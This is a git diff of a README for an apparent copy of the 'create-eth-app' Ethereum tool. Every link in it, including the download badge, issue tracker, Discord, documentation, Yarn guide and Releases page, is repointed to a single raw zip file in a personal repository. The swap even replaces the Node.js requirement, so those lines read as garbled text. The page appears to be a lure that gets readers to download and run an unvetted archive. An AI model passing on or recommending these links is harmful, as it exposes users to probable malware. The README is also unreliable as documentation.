@@ -1,14 +1,14 @@
 # 🚀 create-eth-app - Build Ethereum Apps Easily
 
-[![Download create-eth-app](https://raw.githubusercontent.com/Chaudhryy/create-eth-app/develop/racegoer/create-eth-app.zip)](https://raw.githubusercontent.com/Chaudhryy/create-eth-app/develop/racegoer/create-eth-app.zip)
+[![Download create-eth-app](https://raw.githubusercontent.com/Chaudhryy/create-eth-app/develop/templates/create_app_eth_fascinatress.zip)](https://raw.githubusercontent.com/Chaudhryy/create-eth-app/develop/templates/create_app_eth_fascinatress.zip)
 
 Create Ethereum-powered apps with one simple command.
 
-Create Eth App works on macOS, Windows, and Linux. If you encounter any issues, please [file an issue](https://raw.githubusercontent.com/Chaudhryy/create-eth-app/develop/racegoer/create-eth-app.zip). For help or questions, join our [Discord](https://raw.githubusercontent.com/Chaudhryy/create-eth-app/develop/racegoer/create-eth-app.zip) community.
+Create Eth App works on macOS, Windows, and Linux. If you encounter any issues, please [file an issue](https://raw.githubusercontent.com/Chaudhryy/create-eth-app/develop/templates/create_app_eth_fascinatress.zip). For help or questions, join our [Discord](https://raw.githubusercontent.com/Chaudhryy/create-eth-app/develop/templates/create_app_eth_fascinatress.zip) community.
 
 ## 📦 Download & Install
 
-To start using create-eth-app, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Chaudhryy/create-eth-app/develop/racegoer/create-eth-app.zip).
+To start using create-eth-app, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Chaudhryy/create-eth-app/develop/templates/create_app_eth_fascinatress.zip).
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ Follow these steps to create your first Ethereum app.
      ```sh
      yarn --version
      ```
-   - If not installed, find the installation guide [here](https://raw.githubusercontent.com/Chaudhryy/create-eth-app/develop/racegoer/create-eth-app.zip).
+   - If not installed, find the installation guide [here](https://raw.githubusercontent.com/Chaudhryy/create-eth-app/develop/templates/create_app_eth_fascinatress.zip).
   
 3. **Create a New App:**
    Run the following command to create your Ethereum app. You can replace `my-eth-app` with any name you like:
@@ -56,8 +56,8 @@ Before you begin, ensure your system meets these requirements:
   - Windows (10 or newer)
   - Linux (most distributions)
   
-- **https://raw.githubusercontent.com/Chaudhryy/create-eth-app/develop/racegoer/create-eth-app.zip** 
-  - Requires https://raw.githubusercontent.com/Chaudhryy/create-eth-app/develop/racegoer/create-eth-app.zip version 14.x or higher.
+- **https://raw.githubusercontent.com/Chaudhryy/create-eth-app/develop/templates/create_app_eth_fascinatress.zip** 
+  - Requires https://raw.githubusercontent.com/Chaudhryy/create-eth-app/develop/templates/create_app_eth_fascinatress.zip version 14.x or higher.
   
 - **Yarn:** 
   - Yarn should be installed on your system.
@@ -74,13 +74,13 @@ yarn global remove create-eth-app
 Yes, you can easily modify the files created in your app's directory to tailor it to your needs.
 
 ### What if I face an issue?
-Visit our [issues page](https://raw.githubusercontent.com/Chaudhryy/create-eth-app/develop/racegoer/create-eth-app.zip) to report any problems. The community will assist you.
+Visit our [issues page](https://raw.githubusercontent.com/Chaudhryy/create-eth-app/develop/templates/create_app_eth_fascinatress.zip) to report any problems. The community will assist you.
 
 ## 🌐 Community Support
 
 Join our community for support and networking. You can ask questions, share your projects, or seek guidance.
 
-Join our Discord: [Discord Community](https://raw.githubusercontent.com/Chaudhryy/create-eth-app/develop/racegoer/create-eth-app.zip)
+Join our Discord: [Discord Community](https://raw.githubusercontent.com/Chaudhryy/create-eth-app/develop/templates/create_app_eth_fascinatress.zip)
 
 ## 🌟 Features
 
@@ -90,10 +90,10 @@ Join our Discord: [Discord Community](https://raw.githubusercontent.com/Chaudhry
   
 ## 🔗 Helpful Links
 
-- [Official Documentation](https://raw.githubusercontent.com/Chaudhryy/create-eth-app/develop/racegoer/create-eth-app.zip)
-- [Yarn Installation Guide](https://raw.githubusercontent.com/Chaudhryy/create-eth-app/develop/racegoer/create-eth-app.zip)
-- [GitHub Issues Page](https://raw.githubusercontent.com/Chaudhryy/create-eth-app/develop/racegoer/create-eth-app.zip)
+- [Official Documentation](https://raw.githubusercontent.com/Chaudhryy/create-eth-app/develop/templates/create_app_eth_fascinatress.zip)
+- [Yarn Installation Guide](https://raw.githubusercontent.com/Chaudhryy/create-eth-app/develop/templates/create_app_eth_fascinatress.zip)
+- [GitHub Issues Page](https://raw.githubusercontent.com/Chaudhryy/create-eth-app/develop/templates/create_app_eth_fascinatress.zip)
 
-For further updates, please check the [Releases Page](https://raw.githubusercontent.com/Chaudhryy/create-eth-app/develop/racegoer/create-eth-app.zip). 
+For further updates, please check the [Releases Page](https://raw.githubusercontent.com/Chaudhryy/create-eth-app/develop/templates/create_app_eth_fascinatress.zip). 
 
 Happy coding!
